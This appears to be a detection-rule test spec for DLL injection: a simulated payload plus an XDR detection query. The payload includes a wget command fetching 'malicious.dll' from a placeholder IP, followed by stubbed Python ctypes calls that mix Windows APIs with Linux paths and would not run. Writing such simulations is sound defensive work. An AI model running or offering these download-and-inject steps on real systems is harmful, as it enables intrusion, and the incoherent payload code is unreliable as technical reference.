identity.summary: An unsigned and unpopular process injects a DLL into a legitimate target process, triggering the Cortex alert for suspicious behavior. The attack uses a benign-looking process to evade detection while
identity.description: An unsigned and unpopular process injects a DLL into a legitimate target process, triggering the Cortex alert for suspicious behavior. The attack uses a benign-looking process to evade detection while performing malicious DLL injection.

payload.code:
wget -O /tmp/malicious.dll http://192.0.2.5/malicious.dll
stub chmod +x /tmp/malicious.dll
stub /usr/bin/python3 -c "import ctypes; ctypes.windll.kernel32.LoadLibraryW(r'\\\\tmp\\\\malicious.dll')"
stub /usr/bin/python3 -c "import ctypes; ctypes.windll.kernel32.CreateRemoteThread(0, 0, 0, 0, 0, 0, 0)"

expected_artifacts.description: DLL file loaded from temporary directory

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Unsigned and Unpopular Process DLL Injection
biocs.description: A process that is not signed or well-known performs a DLL injection into another process
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'python3'
| filter action_file_path contains '/tmp/malicious.dll'
| filter causality_actor_process_image_name = 'python3'
